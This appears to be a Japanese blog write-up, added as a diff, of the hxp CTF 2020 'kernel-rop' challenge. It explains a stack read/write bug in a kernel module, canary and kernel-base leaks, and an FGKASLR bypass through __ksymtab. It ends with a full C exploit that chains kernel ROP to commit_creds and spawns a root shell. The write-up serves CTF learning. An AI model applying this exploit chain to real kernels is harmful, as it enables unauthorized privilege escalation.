@@ -1,0 +1,596 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>kROP /  FGKASLR /  kernel exploit /  ksymtab_xxx /  rp++
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<h3>1: イントロ</h3>
+<p>いつぞや開催された <strong>hxp CTF 2020</strong> 。そのpwn問題である <strong>kernel-rop</strong> を解いていく。kernelを起動した瞬間にvulnとtopicをネタバレしていくスタイルだった。</p>
+<p>そういえば、今月は自分の中でkernel-pwn強化月間で、解くべき問題を募集しているので、これは面白いから解いてみろとか、これは為になるから見てみろとかあったら教えてください。</p>
+<p></p>
+<p></p>
+<h3>2: static</h3>
+<h4>basic</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">basic.sh</div>
+<pre class="prettyprint linenums lang-sh">
+/ $ cat /proc/version
+Linux version 5.9.0-rc6+ (martin@martin) (gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0, GNU ld (GNU Binutils f0
+/ $ lsmod
+hackme 20480 0 - Live 0x0000000000000000 (O)
+$ modinfo ./hackme.ko
+filename:       /home/wataru/Documents/ctf/hxp2020/kernel-rop/work/./hackme.ko
+version:        DEV
+author:         Martin Radev &lt;https://twitter.com/martin_b_radev&gt;
+description:    hackme
+license:        GPL
+srcversion:     838E71A30F4FFB7229182E4
+depends:
+retpoline:      Y
+name:           hackme
+vermagic:       5.9.0-rc6+ SMP mod_unload
+
+qemu-system-x86_64 \
+    -m 128M \
+    -cpu kvm64,+smep,+smap \
+    -kernel vmlinuz \
+    -initrd initramfs.cpio.gz \
+    -hdb flag.txt \
+    -snapshot \
+    -nographic \
+    -monitor /dev/null \
+    -no-reboot \
+    -append &quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;
+</pre>
+<p>SMEP有効・SMAP有効・KAISER有効・KASLR有効・oops!-&gt;panic</p>
+<p></p>
+<p><code>vmlinuz</code>を展開して<code>vmlinux</code>にしたところ、以下のメッセージが出た。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">too-many-section.sh</div>
+<pre class="prettyprint linenums lang-sh">
+$ file ./vmlinux
+./vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many section (36140)
+</pre>
+<p> <strong>too many section (36140)</strong> 。カーネルイメージで <em>too many section</em> といえば、 <strong>FGKASLR</strong> である。関数毎にセクションが用意されロード時にランダマイズされるため、関数ポインタのleakの殆どが無意味になる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">fgkaslr.sh</div>
+<pre class="prettyprint linenums lang-sh">
+$ readelf -S ./vmlinux | grep kmem_cache
+  [11414] .text.kmem_cache_ PROGBITS         ffffffff81643220  00843220
+  [11448] .text.kmem_cache_ PROGBITS         ffffffff81644430  00844430
+  [11449] .text.kmem_cache_ PROGBITS         ffffffff81644530  00844530
+  [11457] .text.kmem_cache_ PROGBITS         ffffffff81644810  00844810
+  [11458] .text.kmem_cache_ PROGBITS         ffffffff81644b00  00844b00
+  [12494] .text.kmem_cache_ PROGBITS         ffffffff8169a1b0  0089a1b0
+  [12536] .text.kmem_cache_ PROGBITS         ffffffff8169e710  0089e710
+  [12537] .text.kmem_cache_ PROGBITS         ffffffff8169eb80  0089eb80
+  [12540] .text.kmem_cache_ PROGBITS         ffffffff8169f240  0089f240
+  [12541] .text.kmem_cache_ PROGBITS         ffffffff8169f6b0  0089f6b0
+  [12553] .text.kmem_cache_ PROGBITS         ffffffff816a0f70  008a0f70
+  [12557] .text.kmem_cache_ PROGBITS         ffffffff816a15b0  008a15b0
+  [12559] .text.kmem_cache_ PROGBITS         ffffffff816a1a00  008a1a00
+  [12561] .text.kmem_cache_ PROGBITS         ffffffff816a2020  008a2020
+</pre>
+<p></p>
+<h4>Module</h4>
+<p>おい、ソースないやんけ。その理由を書いた嘆願書も添付されてないやんけ。</p>
+<p> <em>hackme</em> という名前の<code>miscdevice</code>が登録される。</p>
+<p></p>
+<p></p>
+<p>実装されている操作は <em>open/release/read/write</em> の4つ。さてリバースをしようと思いGhidraを開いたら、 <strong>Ghidra君が全ての関数をデコンパイルすることを放棄してしまった。。。</strong>  これ、たまにある事象なので今度原因を調べる。それかIDAも使えるようにしておく。</p>
+<p></p>
+<p></p>
+<p>まぁアセンブリを読めばいいだけなので問題はない。<code>read/write</code>はおおよそ以下の疑似コードのようなことをしている。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">read-write.c</div>
+<pre class="prettyprint linenums lang-c">
+write(struct file *filp, char *data, size_t size, loff_t off){
+    if(size &lt;= 0x1000){
+        __check_object_size(hackme_buf, size, 0);
+        if(_copy_from_user(hackme_buf, buf, sizse)){
+            return -0xE;
+        }
+        memcpy($rsp-0x98, hackme_buf, size); // &lt;-- VULN: なにしてんのお前？？？
+        __stack_chk_fail();
+    }else{
+        _warn_printk(&quot;Buffer_overflow_detected_(%d_&lt;_%u)!&quot;, 0x1000, size);
+        __stack_chk_fail(); // canary @ $rbp-0x18
+        return -0xE;
+    }
+}
+read(struct file *filp, char *data, size_t size){
+    memcpy(hackme_buf, $rsp-0x98, size);    // &lt;-- VULN: not initialized...
+    __check_object_size(hackme_buf, size, 1);
+    if(_copy_to_user(data, hackme_buf, size)){
+        return -0xE;
+    }
+    __stack_chk_fail(); // canary @ $rbp-0x18
+}
+</pre>
+<p></p>
+<p>なんかもう、意味分からんことしてるな。FGKASLRのせいでGDBの表示もイカれてるし、しまいにはAbortしたわ。。。</p>
+<p></p>
+<p></p>
+<p>まぁそれはいいとして、<code>hackme_write()</code>では<code>hackme_buf</code>に読んだデータを、<code>$rsp-0x98</code>へと<code>memcpy()</code>している。この際のサイズ制限は<code>0x1000</code>であるが、これだけのデータをスタックにコピーすると当然崩壊してしまう。だが、<code>$rsp-0x18</code>にカナリアが飼われており、これを崩さないようにしないとOopsする。また、<code>hackme_read()</code>においては<code>$rsp-0x98</code>からのデータを<code>hackme_buf</code>にコピーし、そのあとで<code>hackme_buf</code>をユーザランドにコピーしている。</p>
+<p></p>
+<h3>3: Vuln</h3>
+<p>上のコードからも分かるとおり、スタックがかなりいじれる(R/W)。</p>
+<p></p>
+<p></p>
+<h3>4: leak canary</h3>
+<p>カナリアが飼われているものの、<code>hackme_read()</code>のチェックがガバガバのため、readに関しては思うがままにでき、よって容易にカナリアをleakできる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">canary-leak.c</div>
+<pre class="prettyprint linenums lang-c">
+/** snippet **/
+  _read(fd, rbuf, 0x90);
+  printf(&quot;[+] canary: %lx\n&quot;, ((ulong*)rbuf)[0x80/8]);
+  
+/** result **/
+/ # /tmp/exploit
+[+] canary: 32ce1536acf87a00
+/ #
+</pre>
+<p></p>
+<h3>5: kROP</h3>
+<p>これでcanaryがleakできたため、スタックを任意に書き換えることができるようになった。SMEP/SMAPともに有効であるから、ユーザランドに飛ばすことはできない。また、FGKASLRが有効のためガジェットの位置がなかなか定まらない。FGKASLRが有効でもデータセクション及び一部の関数はランダマイズされないことは知っているが、そういったシンボルをどうやって見つければいいか分からなかった。</p>
+<p></p>
+<h4>__ksymtab_xxx</h4>
+<p>ここで<a href="https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/">author&#x27;s writeup</a>をカンニング。</p>
+<p><code>__ksymtab_xxx</code>エントリをleakすればいいらしい。そこで試しに<code>kmem_cache_alloc()</code>の情報を以下に挙げる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">kmem_cache_alloc_info.sh</div>
+<pre class="prettyprint linenums lang-sh">
+kernbase: 0xffffffff81000000
+kmem_cache_create: 0xffffffff81644b00
+__ksymtab_kmem_cache_create: 0xffffffff81f8b4b0
+__kstrtab_kmem_cache_create: 0xffffffff81fa61ea
+
+(gdb) x/4wx $ksymtab_kmem_cache_create
+0xffffffff81f8b4b0:     0xff6b9650      0x0001ad36      0x0001988a
+</pre>
+<p>僕は<code>__ksymtab_xxx</code>各エントリには、シンボルのアドレス・<code>__kstrtab_xxx</code>へのポインタ・ネームスペースへのポインタがそれぞれ0x8byteで入っているものと思っていたが、上を見る感じそうではない。どうやら、KASLRが利用できるarchにおいては、<a href="https://patchwork.kernel.org/project/linux-arm-kernel/patch/20180626182802.19932-4-ard.biesheuvel@linaro.org/">このパッチ</a>でアドレスの代わりにオフセットを入れるようになったらしい。シンボルの各エントリは以下の構造を持ち、以下のようにして解決される。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">include/linux/export.h</div>
+<pre class="prettyprint linenums lang-h">
+#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
+#include &lt;linux/compiler.h&gt;
+(snipped...)
+#define __KSYMTAB_ENTRY(sym, sec)					\
+	__ADDRESSABLE(sym)						\
+	asm(&quot;	.section \&quot;___ksymtab&quot; sec &quot;+&quot; #sym &quot;\&quot;, \&quot;a\&quot;	\n&quot;	\
+	    &quot;	.balign	4					\n&quot;	\
+	    &quot;__ksymtab_&quot; #sym &quot;:				\n&quot;	\
+	    &quot;	.long	&quot; #sym &quot;- .				\n&quot;	\
+	    &quot;	.long	__kstrtab_&quot; #sym &quot;- .			\n&quot;	\
+	    &quot;	.long	__kstrtabns_&quot; #sym &quot;- .			\n&quot;	\
+	    &quot;	.previous					\n&quot;)
+
+struct kernel_symbol {
+	int value_offset;
+	int name_offset;
+	int namespace_offset;
+};
+#else
+</pre>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">kernel/module.c</div>
+<pre class="prettyprint linenums lang-c">
+static unsigned long kernel_symbol_value(const struct kernel_symbol *sym)
+{
+#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
+	return (unsigned long)offset_to_ptr(&amp;sym-&gt;value_offset);
+#else
+	return sym-&gt;value;
+#endif
+}
+
+static const char *kernel_symbol_name(const struct kernel_symbol *sym)
+{
+#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
+	return offset_to_ptr(&amp;sym-&gt;name_offset);
+#else
+	return sym-&gt;name;
+#endif
+}
+</pre>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">include/linux/compiler.h</div>
+<pre class="prettyprint linenums lang-h">
+static inline void *offset_to_ptr(const int *off)
+{
+	return (void *)((unsigned long)off + *off);
+}
+</pre>
+<p>要は、そのエントリのアドレスに対してそのエントリの持つ値を足してやれば、そのエントリの示すシンボルのアドレス、および<code>__kstrtab_xxx</code>のアドレスになるというわけである。そして、幸いなことにこのエントリ達はreadableなデータであり、FGKASLRの影響を受けない(KASLRの影響は受ける)。よって、この<code>__ksymtab_xxx</code>のアドレス、厳密にはこの配列のインデックスも固定であるためその内のどれか(一番最初のエントリは<code>ffffffff81f85198 r __ksymtab_IO_APIC_get_PCI_irq_vector</code>)が分かればFGKASLRを完全に無効化したことになる。</p>
+<p></p>
+<h4>find not-randomized pointer to leak kernbase</h4>
+<p>だがまだ進捗は全く出ていない。この<code>__ksymtab_xxx</code>のアドレス自体を決定する必要がある。今回は最初スタックからしかleakできないため、このstackをとにかく血眼になって <strong>FGKASLRの影響を受けていないポインタを探す</strong> 。以下のように、<code>$RSP-38*0x8</code>にあるポインタがKASLR有効の状態で何回か試しても影響を受けていなかった。</p>
+<p></p>
+<p></p>
+<p>これで、kernbaseのリークができたことになる。すなわち、<code>__ksymtab_xxx</code>の全てのアドレスもleakできたことになる。</p>
+<p></p>
+<h4>find gadget to leak the data of __ksymtab_xxx</h4>
+<p>さて、<code>__ksymtab_xxx</code>のアドレスが分かったが、今度はこの中身を抜くためのガジェットが必要になる。このガジェットも勿論、FGKASLRの影響を受けないような関数から取ってこなくてはならない。 <strong>ROP問って、ただガジェット探す時間が多くなるから嫌い</strong> 。。。</p>
+<p>ということで、  <strong>rp++</strong>  のラッパーとしてFGKASLRに影響されないようなガジェットを探してくれるシンプルツールを書きました。まだまだバグだらけだけど、ゼロから探すよりかは8億倍楽だと思う。</p>
+<p>https://github.com/smallkirby/kernelpwn/tree/master/tools</p>
+<p></p>
+<p>これを使うと、以下のような感じでFGKASLRの影響を受けないシンボルだけを探してくれて。</p>
+<p></p>
+<p>実際に、これはFGKASLRの影響を受けていないことが分かる。こうなればあとは、ただのkROP問題だ。</p>
+<p></p>
+<p></p>
+<p>これを使って、gadgetを探して以下のようなchainを組んだ。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">chain-to-leak-ksymtab.asm</div>
+<pre class="prettyprint linenums lang-asm">
+  // leak symbols from __ksymtab_xxx
+  save_state();
+  ulong *c = &amp;wbuf[CANARY_OFF];
+  memset(wbuf, &#x27;A&#x27;, 0x200);
+  *c++ = canary;
+  *c++ = &#x27;1&#x27;; // rbx
+  *c++ = &#x27;2&#x27;; // r12
+  *c++ = &#x27;3&#x27;; // rbp
+  *c++ = kernbase + 0x4D11; // pop rax
+  *c++ = kernbase + 0xf87d90; // __ksymtab_commit_creds
+  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
+  *c++ = &#x27;A&#x27;; // rbp
+  *c++ = kernbase + 0x200f23; // go home(swapgs &amp; iretq)
+  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
+    *c++ = &#x27;A&#x27; + ix + 1;
+  *c++ = &amp;NIRUGIRI;
+  *c++ = user_cs;
+  *c++ = user_rflags;
+  *c++ = user_sp;
+  *c++ = user_ss;
+  _write(fd, wbuf, 0x130);
+</pre>
+<p>すると、<code>iretq</code>の直前には以下のようになって、ちゃんとこと<code>NIRUGIRI()</code>に帰れることがわかる。(因みに、なんでか上手くユーザランドに帰れなくて小一時間ほど時間を浪費してしまったが、結局<code>_write()</code>で書き込むバイト数が足りておらず、<code>user_ss</code>等を書き込めていなかったことが原因だった)</p>
+<p></p>
+<p></p>
+<p>但し、まだNIRUGIRIをするには早すぎる。一回のkROPでできることは一つのleakだけだから、これを複数回繰り返してleakを行う。具体的にはleakするシンボルは、<code>commit_creds</code>と<code>prepare_kernel_commit</code>である。<code>current_task</code>に関してはFGKASLRの影響を受けないため問題ない。</p>
+<p></p>
+<h3>6: get ROOT</h3>
+<p>上の方法で<code>commit_creds()</code>と<code>prepare_kernel_commit()</code>をleakしたら、同様に  <strong>neorop++</strong>  でFGKASLRに影響されないガジェットを探し、あとは全く同じ方法で<code>commit_creds(prepare_kernel_commit(0))</code>をするだけである。最後の着地点はユーザランドのシェルを実行する関数にすれば良い。`</p>
+<p></p>
+<h3>7: exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/shm.h&gt;
+
+
+// commands
+#define DEV_PATH &quot;/dev/hackme&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define REP(N) for(int iiiiix=0;iiiiix!=N;++iiiiix)
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  printf(&quot;[!!!] NIRUGIRI!!!\n&quot;);
+  char *argv[] = {&quot;/bin/sh&quot;,NULL};
+  char *envp[] = {NULL};
+  execve(&quot;/bin/sh&quot;,argv,envp);
+}
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+  printf(&quot;[+] save_state: cs:%lx ss:%lx sp:%lx rflags:%lx\n&quot;, user_cs, user_ss, user_sp, user_rflags);
+}
+
+static void shellcode(void){
+  asm(
+    &quot;xor rdi, rdi\n&quot;
+    &quot;mov rbx, QWORD PTR [rsp+0x50]\n&quot;
+    &quot;sub rbx, 0x244566\n&quot;
+    &quot;mov rcx, rbx\n&quot;
+    &quot;call rcx\n&quot;
+    &quot;mov rdi, rax\n&quot;
+    &quot;sub rbx, 0x470\n&quot;
+    &quot;call rbx\n&quot;
+    &quot;add rsp, 0x20\n&quot;
+    &quot;pop rbx\n&quot;
+    &quot;pop r12\n&quot;
+    &quot;pop r13\n&quot;
+    &quot;pop r14\n&quot;
+    &quot;pop r15\n&quot;
+    &quot;pop rbp\n&quot;
+    &quot;ret\n&quot;
+  );
+}
+// (END utils)
+
+// hackme
+int _write(int fd, char *buf, uint size){
+  assert(fd &gt; 0);
+  int res = write(fd, buf, size);
+  assert(res &gt;= 0);
+  return res;
+}
+int _read(int fd, char *buf, uint size){
+  assert(fd &gt; 0);
+  int res = read(fd, buf, size);
+  assert(res &gt;= 0);
+  return res;
+}
+// (END hackme)
+
+#define CANARY_OFF 0x80
+#define RBP_OFF 0x98
+int fd;
+ulong kernbase;
+ulong commit_creds, prepare_kernel_cred, current_task;
+ulong canary;
+char rbuf[0x200];
+char wbuf[0x200];
+
+void level3(void){
+  ulong ret;
+  asm(
+      &quot;movq %0, %%rax\n&quot;
+      : &quot;=r&quot;(ret)
+  );
+  const ulong my_special_cred = ret;
+  printf(&quot;[!] reached Level-3\n&quot;);
+  printf(&quot;[!] my_special_cred: 0x%lx\n&quot;, my_special_cred);
+
+  // into level4
+  save_state();
+  ulong *c = &amp;wbuf[CANARY_OFF];
+  memset(wbuf, &#x27;A&#x27;, 0x200);
+  *c++ = canary;
+  *c++ = &#x27;1&#x27;; // rbx
+  *c++ = &#x27;2&#x27;; // r12
+  *c++ = &#x27;3&#x27;; // rbp
+  *c++ = kernbase + 0x006370; // pop rdi
+  *c++ = my_special_cred;
+  *c++ = commit_creds;
+  *c++ = kernbase + 0x200f23; // go home(swapgs &amp; iretq)
+  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
+    *c++ = &#x27;A&#x27; + ix + 1;
+  *c++ = &amp;NIRUGIRI;
+  *c++ = user_cs;
+  *c++ = user_rflags;
+  *c++ = user_sp;
+  *c++ = user_ss;
+  _write(fd, wbuf, 0x130);
+
+  errExit(&quot;level3&quot;);
+}
+
+void level2(void){
+  ulong ret;
+  asm(
+      &quot;movq %0, %%rax\n&quot;
+      : &quot;=r&quot;(ret)
+  );
+  prepare_kernel_cred = (signed long)kernbase + (signed long)0xf8d4fc + (signed int)ret;
+  printf(&quot;[!] reached Level-2\n&quot;);
+  printf(&quot;[!] prepare_kernel_cred: 0x%lx\n&quot;, prepare_kernel_cred);
+
+  // into level3
+  save_state();
+  ulong *c = &amp;wbuf[CANARY_OFF];
+  memset(wbuf, &#x27;A&#x27;, 0x200);
+  *c++ = canary;
+  *c++ = &#x27;1&#x27;; // rbx
+  *c++ = &#x27;2&#x27;; // r12
+  *c++ = &#x27;3&#x27;; // rbp
+  *c++ = kernbase + 0x006370; // pop rdi
+  *c++ = 0;
+  *c++ = prepare_kernel_cred;
+  *c++ = kernbase + 0x200f23; // go home(swapgs &amp; iretq)
+  printf(&quot;[!!!] 0x%lx\n&quot;, *(c-1));;
+  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
+    *c++ = &#x27;A&#x27; + ix + 1;
+  *c++ = &amp;level3;
+  *c++ = user_cs;
+  *c++ = user_rflags;
+  *c++ = user_sp;
+  *c++ = user_ss;
+  _write(fd, wbuf, 0x130);
+
+  errExit(&quot;level2&quot;);
+}
+
+void level1(void){
+  ulong ret;
+  asm(
+      &quot;movq %0, %%rax\n&quot;
+      : &quot;=r&quot;(ret)
+  );
+  commit_creds = (signed long)kernbase + (signed long)0xf87d90 + (signed int)ret;
+  printf(&quot;[!] reached Level-1\n&quot;);
+  printf(&quot;[!] commit_creds: 0x%lx\n&quot;, commit_creds);
+
+  // into level2
+  save_state();
+  ulong *c = &amp;wbuf[CANARY_OFF];
+  memset(wbuf, &#x27;A&#x27;, 0x200);
+  *c++ = canary;
+  *c++ = &#x27;1&#x27;; // rbx
+  *c++ = &#x27;2&#x27;; // r12
+  *c++ = &#x27;3&#x27;; // rbp
+  *c++ = kernbase + 0x4D11; // pop rax
+  *c++ = kernbase + 0xf8d4fc; // __ksymtab_prepare_kernel_cred
+  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
+  *c++ = &#x27;A&#x27;; // rbp
+  *c++ = kernbase + 0x200f23; // go home(swapgs &amp; iretq)
+  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
+    *c++ = &#x27;A&#x27; + ix + 1;
+  *c++ = &amp;level2;
+  *c++ = user_cs;
+  *c++ = user_rflags;
+  *c++ = user_sp;
+  *c++ = user_ss;
+  _write(fd, wbuf, 0x130);
+
+  errExit(&quot;level1&quot;);
+}
+
+int main(int argc, char *argv[]) {
+  printf(&quot;[.] NIRUGIRI @ %p\n&quot;, &amp;NIRUGIRI);
+  printf(&quot;[.] level1 @ %p\n&quot;, &amp;level1);
+  memset(wbuf, &#x27;A&#x27;, 0x200);
+  memset(rbuf, &#x27;B&#x27;, 0x200);
+  fd = open(DEV_PATH, O_RDWR);
+  assert(fd &gt; 0);
+
+  // leak canary and kernbase
+  _read(fd, rbuf, 0x1a0);
+  canary = ((ulong*)rbuf)[0x10/8];
+  printf(&quot;[+] canary: %lx\n&quot;, canary);
+  kernbase = ((ulong*)rbuf)[38] - ((ulong)0xffffffffb080a157 - (ulong)0xffffffffb0800000);
+  printf(&quot;[!] kernbase: 0x%lx\n&quot;, kernbase);
+
+  // leak symbols from __ksymtab_xxx
+  save_state();
+  ulong *c = &amp;wbuf[CANARY_OFF];
+  memset(wbuf, &#x27;A&#x27;, 0x200);
+  *c++ = canary;
+  *c++ = &#x27;1&#x27;; // rbx
+  *c++ = &#x27;2&#x27;; // r12
+  *c++ = &#x27;3&#x27;; // rbp
+  *c++ = kernbase + 0x4D11; // pop rax
+  *c++ = kernbase + 0xf87d90; // __ksymtab_commit_creds
+  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
+  *c++ = &#x27;A&#x27;; // rbp
+  *c++ = kernbase + 0x200f23; // go home(swapgs &amp; iretq)
+  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
+    *c++ = &#x27;A&#x27; + ix + 1;
+  *c++ = &amp;level1;
+  *c++ = user_cs;
+  *c++ = user_rflags;
+  *c++ = user_sp;
+  *c++ = user_ss;
+  _write(fd, wbuf, 0x130);
+
+  errExit(&quot;main&quot;);
+  return 0;
+}
+
+/* gad go home
+ffffffff81200f23:       59                      pop    rcx
+ffffffff81200f24:       5a                      pop    rdx
+ffffffff81200f25:       5e                      pop    rsi
+ffffffff81200f26:       48 89 e7                mov    rdi,rsp
+ffffffff81200f29:       65 48 8b 24 25 04 60    mov    rsp,QWORD PTR gs:0x6004
+ffffffff81200f30:       00 00
+ffffffff81200f32:       ff 77 30                push   QWORD PTR [rdi+0x30]
+ffffffff81200f35:       ff 77 28                push   QWORD PTR [rdi+0x28]
+ffffffff81200f38:       ff 77 20                push   QWORD PTR [rdi+0x20]
+ffffffff81200f3b:       ff 77 18                push   QWORD PTR [rdi+0x18]
+ffffffff81200f3e:       ff 77 10                push   QWORD PTR [rdi+0x10]
+ffffffff81200f41:       ff 37                   push   QWORD PTR [rdi]
+ffffffff81200f43:       50                      push   rax
+ffffffff81200f44:       eb 43                   jmp    ffffffff81200f89 &lt;_stext+0x200f89&gt;
+ffffffff81200f46:       0f 20 df                mov    rdi,cr3
+ffffffff81200f49:       eb 34                   jmp    ffffffff81200f7f &lt;_stext+0x200f7f&gt;
+*/
+</pre>
+<p></p>
+<h3>8: アウトロ</h3>
+<p></p>
+<p></p>
+<p>FGKASLRをkROPでbypassする、為になる良い問題でした。</p>
+<p></p>
+<p></p>
+<h3>9: symbols without KASLR</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">symbols.txt</div>
+<pre class="prettyprint linenums lang-txt">
+hackme_buf: 0xffffffffc0002440
+</pre>
+<p>信じられるものは、.bss/.dataだけ。アンパンマンと一緒だね。</p>
+<p></p>
+<p></p>
+<h3>10: 参考</h3>
+<p>1: author&#x27;s writeup</p>
+<p><a href='https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/'>https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/</a></p>
+<p>2: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
